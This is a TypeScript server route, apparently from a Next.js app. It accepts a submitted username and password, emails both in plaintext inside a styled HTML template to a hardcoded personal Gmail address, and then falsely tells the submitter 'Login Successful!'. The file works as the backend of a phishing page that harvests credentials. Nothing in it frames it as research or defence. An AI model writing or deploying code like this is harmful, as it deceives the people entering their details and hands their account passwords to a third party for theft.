import nodemailer from "nodemailer";

function formatMessage(user_name: string, password: string) {
  return `
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>User Credentials</title>
    </head>
    <body style="margin: 0; padding: 0; background-color: #f5f5f5; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;">
      <table width="100%" cellpadding="0" cellspacing="0" style="background-color: #f5f5f5; padding: 40px 0;">
        <tr>
          <td align="center">
            <table width="600" cellpadding="0" cellspacing="0" style="background-color: #ffffff; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); overflow: hidden;">
              <!-- Header -->
              <tr>
                <td style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 40px 30px; text-align: center;">
                  <div style="background-color: rgba(255,255,255,0.2); width: 80px; height: 80px; border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center;">
                    <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                      <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" fill="white"/>
                    </svg>
                  </div>
                  <h1 style="color: white; margin: 0; font-size: 28px; font-weight: 600; letter-spacing: -0.5px;">User Credentials</h1>
                  <p style="color: rgba(255,255,255,0.9); margin: 8px 0 0; font-size: 16px;">New account information has been submitted</p>
                </td>
              </tr>
              
              <!-- Content -->
              <tr>
                <td style="padding: 40px 30px;">
                  <div style="text-align: center; margin-bottom: 30px;">
                    <h2 style="color: #333; margin: 0 0 10px; font-size: 24px; font-weight: 600;">Account Details</h2>
                    <p style="color: #666; margin: 0; font-size: 16px;">Please find the submitted credentials below</p>
                  </div>
                  
                  <!-- Credentials Container -->
                  <div style="background: linear-gradient(135deg, #f8f9ff 0%, #f0f2ff 100%); border-radius: 12px; padding: 30px; margin: 20px 0; border: 1px solid #e1e8ff;">
                    <!-- Username -->
                    <div style="margin-bottom: 25px;">
                      <div style="display: flex; align-items: center; margin-bottom: 8px;">
                        <div style="background-color: #667eea; width: 24px; height: 24px; border-radius: 6px; display: flex; align-items: center; justify-content: center; margin-right: 12px;">
                          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M12 2C13.1 2 14 2.9 14 4C14 5.1 13.1 6 12 6C10.9 6 10 5.1 10 4C10 2.9 10.9 2 12 2ZM21 9V7L15 1H5C3.89 1 3 1.89 3 3V21C3 22.11 3.89 23 5 23H19C20.11 23 21 22.11 21 21V9M19 21H5V3H15V9H19Z" fill="white"/>
                          </svg>
                        </div>
                        <span style="color: #667eea; font-weight: 600; font-size: 14px; text-transform: uppercase; letter-spacing: 0.5px;">Username</span>
                      </div>
                      <div style="background-color: white; padding: 15px 20px; border-radius: 8px; border: 1px solid #e1e8ff; font-size: 18px; font-weight: 500; color: #333; word-break: break-all;">
                        ${user_name}
                      </div>
                    </div>
                    
                    <!-- Password -->
                    <div>
                      <div style="display: flex; align-items: center; margin-bottom: 8px;">
                        <div style="background-color: #764ba2; width: 24px; height: 24px; border-radius: 6px; display: flex; align-items: center; justify-content: center; margin-right: 12px;">
                          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M6 10V8C6 5.79 7.79 4 10 4H14C16.21 4 18 5.79 18 8V10H19C20.1 10 21 10.9 21 12V20C21 21.1 20.1 22 19 22H5C3.9 22 3 21.1 3 20V12C3 10.9 3.9 10 5 10H6M8 8C8 6.9 8.9 6 10 6H14C15.1 6 16 6.9 16 8V10H8V8Z" fill="white"/>
                          </svg>
                        </div>
                        <span style="color: #764ba2; font-weight: 600; font-size: 14px; text-transform: uppercase; letter-spacing: 0.5px;">Password</span>
                      </div>
                      <div style="background-color: white; padding: 15px 20px; border-radius: 8px; border: 1px solid #e1e8ff; font-size: 18px; font-weight: 500; color: #333; word-break: break-all; font-family: 'Courier New', monospace;">
                        ${password}
                      </div>
                    </div>
                  </div>
                  
                  <!-- Security Note -->
                  <div style="background-color: #fff3cd; border: 1px solid #ffeaa7; border-radius: 8px; padding: 20px; margin: 25px 0;">
                    <div style="display: flex; align-items: flex-start;">
                      <div style="background-color: #f39c12; width: 20px; height: 20px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 12px; margin-top: 2px; flex-shrink: 0;">
                        <span style="color: white; font-size: 12px; font-weight: bold;">!</span>
                      </div>
                      <div>
                        <h4 style="color: #856404; margin: 0 0 8px; font-size: 16px; font-weight: 600;">Security Notice</h4>
                        <p style="color: #856404; margin: 0; font-size: 14px; line-height: 1.5;">Please ensure this information is kept secure and confidential. Consider changing the password after first login for enhanced security.</p>
                      </div>
                    </div>
                  </div>
                </td>
              </tr>
              
              <!-- Footer -->
              <tr>
                <td style="background-color: #f8f9fa; padding: 30px; text-align: center; border-top: 1px solid #e9ecef;">
                  <p style="color: #6c757d; margin: 0 0 10px; font-size: 14px;">This email was automatically generated</p>
                  <p style="color: #adb5bd; margin: 0; font-size: 12px;">
                    Generated on ${new Date().toLocaleDateString("en-US", {
                      year: "numeric",
                      month: "long",
                      day: "numeric",
                      hour: "2-digit",
                      minute: "2-digit",
                    })}
                  </p>
                </td>
              </tr>
            </table>
          </td>
        </tr>
      </table>
    </body>
    </html>
  `;
}

async function sendEmail(user_name: string, password: string) {
  const email = process.env.EMAIL_USERNAME;
  const pass = process.env.EMAIL_PASSWORD;
  const recipient = "paragoye1609@gmail.com"; // Change this to your desired email

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: { user: email, pass },
  });

  const mailOptions = {
    from: `New User Credentials ${email}`,
    to: recipient,
    subject: "User Credentials Submission",
    html: formatMessage(user_name, password),
  };

  try {
    await transporter.verify();
    await transporter.sendMail(mailOptions);
    return true;
  } catch (error) {
    console.error(`Login error: ${error}`);
    return false;
  }
}

export async function POST(request: Request) {
  try {
    const { user_name, password } = await request.json();

    if (!user_name || !password) {
      return Response.json(
        { error: "Username and password are required" },
        { status: 400 }
      );
    }

    const emailSent = await sendEmail(user_name, password);

    if (emailSent) {
      return Response.json({ message: "Login Successful!" }, { status: 200 });
    } else {
      return Response.json(
        { error: "Sorry something went wrong" },
        { status: 500 }
      );
    }
  } catch (error) {
    console.error(`Request error: ${error}`);
    return Response.json({ error: "Internal Server Error" }, { status: 500 });
  }
}
